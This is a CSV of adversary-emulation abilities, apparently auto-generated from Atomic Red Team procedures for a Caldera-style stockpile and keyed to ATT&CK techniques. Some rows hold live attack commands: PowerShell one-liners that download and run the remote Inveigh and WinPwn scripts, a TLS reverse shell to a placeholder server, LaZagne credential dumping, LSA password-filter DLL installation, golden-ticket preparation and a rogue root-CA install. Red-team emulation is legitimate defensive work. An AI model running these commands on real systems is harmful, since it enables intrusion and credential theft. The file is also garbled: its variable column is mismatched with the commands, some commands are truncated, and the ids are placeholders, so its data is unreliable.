id,name,description,tactic,technique_attack_id,technique_full_name,windows_command,windows_executor,linux_command,linux_executor,darwin_command,darwin_executor,privilege,payloads,cleanup,target_dir,yml_filename,vars,has_hardcoded_abs_paths_hint
<GENERATE_UUIDv4>,Subvert Trust Controls,Ability for Subvert Trust Controls (ATT&CK T1553). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1553,Subvert Trust Controls,"Mount-DiskImage -ImagePath ""#{path_of_iso}""",psh,"openssl genrsa -out #{key_filename} 4096 openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj ""/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com"" -out #{cert_filename} cp #{cert_filename} /etc/pki/ca-trust/source/anchors/ update-ca-trust",sh,"sudo security add-trusted-cert -d -r trustRoot -k ""/Library/Keychains/System.keychain"" ""#{cert_filename}""",sh,,,,stockpile/data/abilities/defense-evasion/,T1553__subvert-trust-controls.yml,atomics_dir;target_host,yes
<GENERATE_UUIDv4>,Compromise Host Software Binary,Ability for Compromise Host Software Binary (ATT&CK T1554). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1554,Compromise Host Software Binary,,,,,,,,,,stockpile/data/abilities/persistence/,T1554__compromise-host-software-binary.yml,,no
<GENERATE_UUIDv4>,Credentials from Password Stores,Ability for Credentials from Password Stores (ATT&CK T1555). Generated from Atomic Red Team procedures; review and test safely before use.,credential-access,T1555,Credentials from Password Stores,"Start-Process ""#{file_path}\Sysinternals\accesschk.exe"" -ArgumentList ""-accepteula .""",psh,'python3 #{lazagne_path}/laZagne.py #{specific_module} >> #{output_file}',sh,"cd ~/Library/Cookies grep -q ""#{search_string}"" ""Cookies.binarycookies""",sh,,,,stockpile/data/abilities/credential-access/,T1555__credentials-from-password-stores.yml,,no
<GENERATE_UUIDv4>,Modify Authentication Process,Ability for Modify Authentication Process (ATT&CK T1556). Generated from Atomic Red Team procedures; review and test safely before use.,credential-access,T1556,Modify Authentication Process,"reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ ""#{atomics_dir}\T1556.002\lsa_backup.reg"" $passwordFilterName = (Copy-Item ""#{dll_path}\#{dll_name}"" -Destination ""C:\Windows\System32"" -PassThru).basename $lsaKey = Get-Item ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"" $notificationPackagesValues = $lsaKey.GetValue(""Notification Packages"") $notificationPackagesValues += $passwordFilterName Set-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"" ""Notification Packages"" $notificationPackagesValues",psh,"sudo sed -i ""#{index}s,^,#{pam_rule}\n,g"" #{path_to_pam_conf}",sh,,,,,,stockpile/data/abilities/credential-access/,T1556__modify-authentication-process.yml,audiofile;duration;filename,no
<GENERATE_UUIDv4>,Adversary-in-the-Middle,Ability for Adversary-in-the-Middle (ATT&CK T1557). Generated from Atomic Red Team procedures; review and test safely before use.,collection,T1557,Adversary-in-the-Middle,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr ""https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1"" -UseBasicParsing) Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y",psh,,,,,,,,stockpile/data/abilities/collection/,T1557__adversary-in-the-middle.yml,,no
<GENERATE_UUIDv4>,Steal or Forge Kerberos Tickets,Ability for Steal or Forge Kerberos Tickets (ATT&CK T1558). Generated from Atomic Red Team procedures; review and test safely before use.,credential-access,T1558,Steal or Forge Kerberos Tickets,"Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore # get current domain SID if default was used $domain_sid = ""#{domain_sid}"" If ($domain_sid -Match ""DEFAULT"") { # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60 $domain = gwmi Win32_ComputerSystem | Select -Expand Domain $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-')) } # create batch file with commands to run in a separate ""runas /netonly"" session # so we don't purge Kerberos ticket from the current Windows session # its output goes to golden.txt temp file, because we cannot capture ""runas /netonly"" output otherwis …",psh,,,,,,,,stockpile/data/abilities/credential-access/,T1558__steal-or-forge-kerberos-tickets.yml,base64_data;destination_url,no
<GENERATE_UUIDv4>,Inter-Process Communication,Ability for Inter-Process Communication (ATT&CK T1559). Generated from Atomic Red Team procedures; review and test safely before use.,execution,T1559,Inter-Process Communication,"""#{atomics_dir}\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 1",psh,,,,,,,,stockpile/data/abilities/execution/,T1559__inter-process-communication.yml,realname;username,yes
<GENERATE_UUIDv4>,Disk Wipe,Ability for Disk Wipe (ATT&CK T1561). Generated from Atomic Red Team procedures; review and test safely before use.,impact,T1561,Disk Wipe,,,,,,,,,,stockpile/data/abilities/impact/,T1561__disk-wipe.yml,,no
<GENERATE_UUIDv4>,Remote Service Session Hijacking,Ability for Remote Service Session Hijacking (ATT&CK T1563). Generated from Atomic Red Team procedures; review and test safely before use.,lateral-movement,T1563,Remote Service Session Hijacking,"query user sc.exe create sesshijack binpath= ""cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}"" net start sesshijack",psh,,,,,,,,stockpile/data/abilities/lateral-movement/,T1563__remote-service-session-hijacking.yml,encoded_file;message,no
<GENERATE_UUIDv4>,Phishing,Ability for Phishing (ATT&CK T1566). Generated from Atomic Red Team procedures; review and test safely before use.,initial-access,T1566,Phishing,$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm' [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm,psh,,,,,,,,stockpile/data/abilities/initial-access/,T1566__phishing.yml,,no
<GENERATE_UUIDv4>,Dynamic Resolution,Ability for Dynamic Resolution (ATT&CK T1568). Generated from Atomic Red Team procedures; review and test safely before use.,command-and-control,T1568,Dynamic Resolution,,,,,,,,,,stockpile/data/abilities/command-and-control/,T1568__dynamic-resolution.yml,,no
<GENERATE_UUIDv4>,Non-Standard Port,Ability for Non-Standard Port (ATT&CK T1571). Generated from Atomic Red Team procedures; review and test safely before use.,command-and-control,T1571,Non-Standard Port,Test-NetConnection -ComputerName #{domain} -port #{port},psh,echo quit | telnet #{domain} #{port} exit 0,sh,echo quit | telnet #{domain} #{port} exit 0,sh,,,,stockpile/data/abilities/command-and-control/,T1571__non-standard-port.yml,,no
<GENERATE_UUIDv4>,Protocol Tunneling,Ability for Protocol Tunneling (ATT&CK T1572). Generated from Atomic Red Team procedures; review and test safely before use.,command-and-control,T1572,Protocol Tunneling,"for($i=0; $i -le #{query_volume}; $i++) { (Invoke-WebRequest ""#{doh_server}?name=#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}&type=#{query_type}"" -UseBasicParsing).Content }",psh,#{binary_path} host -p #{port} &,sh,#{binary_path} host -p #{port} &,sh,,,,stockpile/data/abilities/command-and-control/,T1572__protocol-tunneling.yml,,no
<GENERATE_UUIDv4>,Encrypted Channel,Ability for Encrypted Channel (ATT&CK T1573). Generated from Atomic Red Team procedures; review and test safely before use.,command-and-control,T1573,Encrypted Channel,"$server_ip = #{server_ip} $server_port = #{server_port} $socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}') $stream = $socket.GetStream() $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback])) $sslStream.AuthenticateAsClient('fakedomain.example', $null, ""Tls12"", $false) $writer = new-object System.IO.StreamWriter($sslStream) $writer.Write('PS ' + (pwd).Path + '> ') $writer.flush() [byte[]]$bytes = 0..65535|%{0}; while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0) {$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data | Out-String ) 2>&1; $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).G …",psh,,,,,,,,stockpile/data/abilities/command-and-control/,T1573__encrypted-channel.yml,,no
<GENERATE_UUIDv4>,Modify Cloud Compute Infrastructure,Ability for Modify Cloud Compute Infrastructure (ATT&CK T1578). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1578,Modify Cloud Compute Infrastructure,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1578__modify-cloud-compute-infrastructure.yml,,no
<GENERATE_UUIDv4>,Cloud Infrastructure Discovery,Ability for Cloud Infrastructure Discovery (ATT&CK T1580). Generated from Atomic Red Team procedures; review and test safely before use.,discovery,T1580,Cloud Infrastructure Discovery,,,"export AWS_REGION=#{aws_region} cd #{stratus_path} echo ""Stratus: Start Warmup."" ./stratus warmup aws.discovery.ec2-enumerate-from-instance echo ""Stratus: Start Detonate."" ./stratus detonate aws.discovery.ec2-enumerate-from-instance",sh,"export AWS_REGION=#{aws_region} cd #{stratus_path} echo ""Stratus: Start Warmup."" ./stratus warmup aws.discovery.ec2-enumerate-from-instance echo ""Stratus: Start Detonate."" ./stratus detonate aws.discovery.ec2-enumerate-from-instance",sh,,,,stockpile/data/abilities/discovery/,T1580__cloud-infrastructure-discovery.yml,,no
<GENERATE_UUIDv4>,Acquire Infrastructure,Ability for Acquire Infrastructure (ATT&CK T1583). Generated from Atomic Red Team procedures; review and test safely before use.,resource-development,T1583,Acquire Infrastructure,,,,,,,,,,stockpile/data/abilities/resource-development/,T1583__acquire-infrastructure.yml,,no
<GENERATE_UUIDv4>,Compromise Infrastructure,Ability for Compromise Infrastructure (ATT&CK T1584). Generated from Atomic Red Team procedures; review and test safely before use.,resource-development,T1584,Compromise Infrastructure,,,,,,,,,,stockpile/data/abilities/resource-development/,T1584__compromise-infrastructure.yml,,no
<GENERATE_UUIDv4>,Establish Accounts,Ability for Establish Accounts (ATT&CK T1585). Generated from Atomic Red Team procedures; review and test safely before use.,resource-development,T1585,Establish Accounts,,,,,,,,,,stockpile/data/abilities/resource-development/,T1585__establish-accounts.yml,,no
<GENERATE_UUIDv4>,Compromise Accounts,Ability for Compromise Accounts (ATT&CK T1586). Generated from Atomic Red Team procedures; review and test safely before use.,resource-development,T1586,Compromise Accounts,,,,,,,,,,stockpile/data/abilities/resource-development/,T1586__compromise-accounts.yml,,no
<GENERATE_UUIDv4>,Develop Capabilities,Ability for Develop Capabilities (ATT&CK T1587). Generated from Atomic Red Team procedures; review and test safely before use.,resource-development,T1587,Develop Capabilities,,,,,,,,,,stockpile/data/abilities/resource-development/,T1587__develop-capabilities.yml,,no
<GENERATE_UUIDv4>,Obtain Capabilities,Ability for Obtain Capabilities (ATT&CK T1588). Generated from Atomic Red Team procedures; review and test safely before use.,resource-development,T1588,Obtain Capabilities,,,,,,,,,,stockpile/data/abilities/resource-development/,T1588__obtain-capabilities.yml,,no
<GENERATE_UUIDv4>,Gather Victim Identity Information,Ability for Gather Victim Identity Information (ATT&CK T1589). Generated from Atomic Red Team procedures; review and test safely before use.,reconnaissance,T1589,Gather Victim Identity Information,,,,,,,,,,stockpile/data/abilities/reconnaissance/,T1589__gather-victim-identity-information.yml,,no
<GENERATE_UUIDv4>,Gather Victim Network Information,Ability for Gather Victim Network Information (ATT&CK T1590). Generated from Atomic Red Team procedures; review and test safely before use.,reconnaissance,T1590,Gather Victim Network Information,,,,,,,,,,stockpile/data/abilities/reconnaissance/,T1590__gather-victim-network-information.yml,,no
<GENERATE_UUIDv4>,Gather Victim Org Information,Ability for Gather Victim Org Information (ATT&CK T1591). Generated from Atomic Red Team procedures; review and test safely before use.,reconnaissance,T1591,Gather Victim Org Information,,,,,,,,,,stockpile/data/abilities/reconnaissance/,T1591__gather-victim-org-information.yml,,no
<GENERATE_UUIDv4>,Gather Victim Host Information,Ability for Gather Victim Host Information (ATT&CK T1592). Generated from Atomic Red Team procedures; review and test safely before use.,reconnaissance,T1592,Gather Victim Host Information,"Get-CimInstance -Query ""SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')""",psh,,,,,,,,stockpile/data/abilities/reconnaissance/,T1592__gather-victim-host-information.yml,,no
<GENERATE_UUIDv4>,Search Open Websites/Domains,Ability for Search Open Websites/Domains (ATT&CK T1593). Generated from Atomic Red Team procedures; review and test safely before use.,reconnaissance,T1593,Search Open Websites/Domains,,,,,,,,,,stockpile/data/abilities/reconnaissance/,T1593__search-open-websites-domains.yml,,no
<GENERATE_UUIDv4>,Search Victim-Owned Websites,Ability for Search Victim-Owned Websites (ATT&CK T1594). Generated from Atomic Red Team procedures; review and test safely before use.,reconnaissance,T1594,Search Victim-Owned Websites,,,,,,,,,,stockpile/data/abilities/reconnaissance/,T1594__search-victim-owned-websites.yml,,no
<GENERATE_UUIDv4>,Active Scanning,Ability for Active Scanning (ATT&CK T1595). Generated from Atomic Red Team procedures; review and test safely before use.,reconnaissance,T1595,Active Scanning,"Import-Module ""#{atomics_dir}/T1595.003/src/WebServerScan.ps1"" Invoke-WordlistScan -Target ""#{target}"" -Wordlist ""#{wordlist}"" -Timeout ""#{request_timeout}"" -OutputFile ""#{output_file}"" Write-Host ""Scan complete. Results saved to: #{output_file}""",psh,"Import-Module ""#{atomics_dir}/T1595.003/src/WebServerScan.ps1"" Invoke-WordlistScan -Target ""#{target}"" -Wordlist ""#{wordlist}"" -Timeout ""#{request_timeout}"" -OutputFile ""#{output_file}"" Write-Host ""Scan complete. Results saved to: #{output_file}""",sh,"Import-Module ""#{atomics_dir}/T1595.003/src/WebServerScan.ps1"" Invoke-WordlistScan -Target ""#{target}"" -Wordlist ""#{wordlist}"" -Timeout ""#{request_timeout}"" -OutputFile ""#{output_file}"" Write-Host ""Scan complete. Results saved to: #{output_file}""",sh,,,,stockpile/data/abilities/reconnaissance/,T1595__active-scanning.yml,,no
<GENERATE_UUIDv4>,Search Open Technical Databases,Ability for Search Open Technical Databases (ATT&CK T1596). Generated from Atomic Red Team procedures; review and test safely before use.,reconnaissance,T1596,Search Open Technical Databases,,,,,,,,,,stockpile/data/abilities/reconnaissance/,T1596__search-open-technical-databases.yml,,no
<GENERATE_UUIDv4>,Search Closed Sources,Ability for Search Closed Sources (ATT&CK T1597). Generated from Atomic Red Team procedures; review and test safely before use.,reconnaissance,T1597,Search Closed Sources,,,,,,,,,,stockpile/data/abilities/reconnaissance/,T1597__search-closed-sources.yml,,no
<GENERATE_UUIDv4>,Phishing for Information,Ability for Phishing for Information (ATT&CK T1598). Generated from Atomic Red Team procedures; review and test safely before use.,reconnaissance,T1598,Phishing for Information,,,,,,,,,,stockpile/data/abilities/reconnaissance/,T1598__phishing-for-information.yml,,no
<GENERATE_UUIDv4>,Network Boundary Bridging,Ability for Network Boundary Bridging (ATT&CK T1599). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1599,Network Boundary Bridging,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1599__network-boundary-bridging.yml,,no
<GENERATE_UUIDv4>,Weaken Encryption,Ability for Weaken Encryption (ATT&CK T1600). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1600,Weaken Encryption,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1600__weaken-encryption.yml,,no
<GENERATE_UUIDv4>,Modify System Image,Ability for Modify System Image (ATT&CK T1601). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1601,Modify System Image,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1601__modify-system-image.yml,file_or_folder;numeric_mode,no
<GENERATE_UUIDv4>,Data from Configuration Repository,Ability for Data from Configuration Repository (ATT&CK T1602). Generated from Atomic Red Team procedures; review and test safely before use.,collection,T1602,Data from Configuration Repository,,,,,,,,,,stockpile/data/abilities/collection/,T1602__data-from-configuration-repository.yml,,no
<GENERATE_UUIDv4>,Forge Web Credentials,Ability for Forge Web Credentials (ATT&CK T1606). Generated from Atomic Red Team procedures; review and test safely before use.,credential-access,T1606,Forge Web Credentials,,,,,,,,,,stockpile/data/abilities/credential-access/,T1606__forge-web-credentials.yml,encrypted_file_name;file_password;input_file_path,no
<GENERATE_UUIDv4>,Stage Capabilities,Ability for Stage Capabilities (ATT&CK T1608). Generated from Atomic Red Team procedures; review and test safely before use.,resource-development,T1608,Stage Capabilities,,,,,,,,,,stockpile/data/abilities/resource-development/,T1608__stage-capabilities.yml,,no
<GENERATE_UUIDv4>,Container Administration Command,Ability for Container Administration Command (ATT&CK T1609). Generated from Atomic Red Team procedures; review and test safely before use.,execution,T1609,Container Administration Command,,,,,,,,,,stockpile/data/abilities/execution/,T1609__container-administration-command.yml,,no
<GENERATE_UUIDv4>,Deploy Container,Ability for Deploy Container (ATT&CK T1610). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1610,Deploy Container,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1610__deploy-container.yml,,no
<GENERATE_UUIDv4>,Escape to Host,Ability for Escape to Host (ATT&CK T1611). Generated from Atomic Red Team procedures; review and test safely before use.,privilege-escalation,T1611,Escape to Host,,,,,,,,,,stockpile/data/abilities/privilege-escalation/,T1611__escape-to-host.yml,,no
<GENERATE_UUIDv4>,Build Image on Host,Ability for Build Image on Host (ATT&CK T1612). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1612,Build Image on Host,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1612__build-image-on-host.yml,,no
<GENERATE_UUIDv4>,Container and Resource Discovery,Ability for Container and Resource Discovery (ATT&CK T1613). Generated from Atomic Red Team procedures; review and test safely before use.,discovery,T1613,Container and Resource Discovery,,,,,,,,,,stockpile/data/abilities/discovery/,T1613__container-and-resource-discovery.yml,,no
<GENERATE_UUIDv4>,System Location Discovery,Ability for System Location Discovery (ATT&CK T1614). Generated from Atomic Red Team procedures; review and test safely before use.,discovery,T1614,System Location Discovery,reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language,psh,locale,sh,curl -k #{ip_lookup_url},sh,,,,stockpile/data/abilities/discovery/,T1614__system-location-discovery.yml,timeout;user_account,no
<GENERATE_UUIDv4>,Group Policy Discovery,Ability for Group Policy Discovery (ATT&CK T1615). Generated from Atomic Red Team procedures; review and test safely before use.,discovery,T1615,Group Policy Discovery,gpresult /z,psh,,,,,,,,stockpile/data/abilities/discovery/,T1615__group-policy-discovery.yml,,no
<GENERATE_UUIDv4>,Cloud Storage Object Discovery,Ability for Cloud Storage Object Discovery (ATT&CK T1619). Generated from Atomic Red Team procedures; review and test safely before use.,discovery,T1619,Cloud Storage Object Discovery,,,,,,,,,,stockpile/data/abilities/discovery/,T1619__cloud-storage-object-discovery.yml,,yes
<GENERATE_UUIDv4>,Reflective Code Loading,Ability for Reflective Code Loading (ATT&CK T1620). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1620,Reflective Code Loading,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') mimiload -consoleoutput -noninteractive,psh,,,,,,,,stockpile/data/abilities/defense-evasion/,T1620__reflective-code-loading.yml,atomics_dir;cert_filename,yes
<GENERATE_UUIDv4>,Multi-Factor Authentication Request Generation,Ability for Multi-Factor Authentication Request Generation (ATT&CK T1621). Generated from Atomic Red Team procedures; review and test safely before use.,credential-access,T1621,Multi-Factor Authentication Request Generation,,,,,,,,,,stockpile/data/abilities/credential-access/,T1621__multi-factor-authentication-request-generation.yml,search_string,no
<GENERATE_UUIDv4>,Debugger Evasion,Ability for Debugger Evasion (ATT&CK T1622). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1622,Debugger Evasion,"# Check for common debugger processes $debuggerProcesses = Get-Process | Where-Object { $_.ProcessName -match ""dbg"" -or $_.ProcessName -match ""debug"" } # Check for debugging flags $debuggingFlags = [System.Diagnostics.Debugger]::IsAttached",psh,,,,,,,,stockpile/data/abilities/defense-evasion/,T1622__debugger-evasion.yml,,no
<GENERATE_UUIDv4>,Plist File Modification,Ability for Plist File Modification (ATT&CK T1647). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1647,Plist File Modification,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1647__plist-file-modification.yml,,no
<GENERATE_UUIDv4>,Serverless Execution,Ability for Serverless Execution (ATT&CK T1648). Generated from Atomic Red Team procedures; review and test safely before use.,execution,T1648,Serverless Execution,,,,,,,,,,stockpile/data/abilities/execution/,T1648__serverless-execution.yml,binary_path;domain;port,no
<GENERATE_UUIDv4>,Steal or Forge Authentication Certificates,Ability for Steal or Forge Authentication Certificates (ATT&CK T1649). Generated from Atomic Red Team procedures; review and test safely before use.,credential-access,T1649,Steal or Forge Authentication Certificates,"$archive=""$env:PUBLIC\T1649\atomic_certs.zip"" $exfilpath=""$env:PUBLIC\T1649\certs"" Add-Type -assembly ""system.io.compression.filesystem"" Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore mkdir $exfilpath | Out-Null foreach ($cert in (gci Cert:\CurrentUser\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\$($cert.FriendlyName).cer} [io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)",psh,,,,,,,,stockpile/data/abilities/credential-access/,T1649__steal-or-forge-authentication-certificates.yml,aws_region;stratus_path,no
<GENERATE_UUIDv4>,Acquire Access,Ability for Acquire Access (ATT&CK T1650). Generated from Atomic Red Team procedures; review and test safely before use.,resource-development,T1650,Acquire Access,,,,,,,,,,stockpile/data/abilities/resource-development/,T1650__acquire-access.yml,,no
<GENERATE_UUIDv4>,Cloud Administration Command,Ability for Cloud Administration Command (ATT&CK T1651). Generated from Atomic Red Team procedures; review and test safely before use.,execution,T1651,Cloud Administration Command,,,,,,,,,,stockpile/data/abilities/execution/,T1651__cloud-administration-command.yml,,no
<GENERATE_UUIDv4>,Device Driver Discovery,Ability for Device Driver Discovery (ATT&CK T1652). Generated from Atomic Red Team procedures; review and test safely before use.,discovery,T1652,Device Driver Discovery,driverquery /v /fo list driverquery /si /fo list,psh,,,,,,,,stockpile/data/abilities/discovery/,T1652__device-driver-discovery.yml,,no
<GENERATE_UUIDv4>,Power Settings,Ability for Power Settings (ATT&CK T1653). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1653,Power Settings,,,,,,,,,,stockpile/data/abilities/persistence/,T1653__power-settings.yml,,no
<GENERATE_UUIDv4>,Log Enumeration,Ability for Log Enumeration (ATT&CK T1654). Generated from Atomic Red Team procedures; review and test safely before use.,discovery,T1654,Log Enumeration,powershell -c {get-eventlog 'Security' | where {$_.Message -like '*SYSTEM*'} | export-csv $env:temp\T1654_events.txt},psh,,,,,,,,stockpile/data/abilities/discovery/,T1654__log-enumeration.yml,atomics_dir;output_file;request_timeout;target;wordlist,no
<GENERATE_UUIDv4>,Impersonation,Ability for Impersonation (ATT&CK T1656). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1656,Impersonation,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1656__impersonation.yml,,no
<GENERATE_UUIDv4>,Financial Theft,Ability for Financial Theft (ATT&CK T1657). Generated from Atomic Red Team procedures; review and test safely before use.,impact,T1657,Financial Theft,,,,,,,,,,stockpile/data/abilities/impact/,T1657__financial-theft.yml,,no
<GENERATE_UUIDv4>,Content Injection,Ability for Content Injection (ATT&CK T1659). Generated from Atomic Red Team procedures; review and test safely before use.,command-and-control,T1659,Content Injection,,,,,,,,,,stockpile/data/abilities/command-and-control/,T1659__content-injection.yml,,no
<GENERATE_UUIDv4>,Hide Infrastructure,Ability for Hide Infrastructure (ATT&CK T1665). Generated from Atomic Red Team procedures; review and test safely before use.,command-and-control,T1665,Hide Infrastructure,,,,,,,,,,stockpile/data/abilities/command-and-control/,T1665__hide-infrastructure.yml,,no
<GENERATE_UUIDv4>,Modify Cloud Resource Hierarchy,Ability for Modify Cloud Resource Hierarchy (ATT&CK T1666). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1666,Modify Cloud Resource Hierarchy,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1666__modify-cloud-resource-hierarchy.yml,ip_lookup_url,no
<GENERATE_UUIDv4>,Email Bombing,Ability for Email Bombing (ATT&CK T1667). Generated from Atomic Red Team procedures; review and test safely before use.,impact,T1667,Email Bombing,,,,,,,,,,stockpile/data/abilities/impact/,T1667__email-bombing.yml,,no
<GENERATE_UUIDv4>,Exclusive Control,Ability for Exclusive Control (ATT&CK T1668). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1668,Exclusive Control,,,,,,,,,,stockpile/data/abilities/persistence/,T1668__exclusive-control.yml,,no
<GENERATE_UUIDv4>,Wi-Fi Networks,Ability for Wi-Fi Networks (ATT&CK T1669). Generated from Atomic Red Team procedures; review and test safely before use.,initial-access,T1669,Wi-Fi Networks,,,,,,,,,,stockpile/data/abilities/initial-access/,T1669__wi-fi-networks.yml,,no
<GENERATE_UUIDv4>,Cloud Application Integration,Ability for Cloud Application Integration (ATT&CK T1671). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1671,Cloud Application Integration,,,,,,,,,,stockpile/data/abilities/persistence/,T1671__cloud-application-integration.yml,,no
<GENERATE_UUIDv4>,Email Spoofing,Ability for Email Spoofing (ATT&CK T1672). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1672,Email Spoofing,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1672__email-spoofing.yml,,no
<GENERATE_UUIDv4>,Virtual Machine Discovery,Ability for Virtual Machine Discovery (ATT&CK T1673). Generated from Atomic Red Team procedures; review and test safely before use.,discovery,T1673,Virtual Machine Discovery,,,,,,,,,,stockpile/data/abilities/discovery/,T1673__virtual-machine-discovery.yml,,no
<GENERATE_UUIDv4>,Input Injection,Ability for Input Injection (ATT&CK T1674). Generated from Atomic Red Team procedures; review and test safely before use.,execution,T1674,Input Injection,,,,,,,,,,stockpile/data/abilities/execution/,T1674__input-injection.yml,,no
<GENERATE_UUIDv4>,ESXi Administration Command,Ability for ESXi Administration Command (ATT&CK T1675). Generated from Atomic Red Team procedures; review and test safely before use.,execution,T1675,ESXi Administration Command,,,,,,,,,,stockpile/data/abilities/execution/,T1675__esxi-administration-command.yml,,no
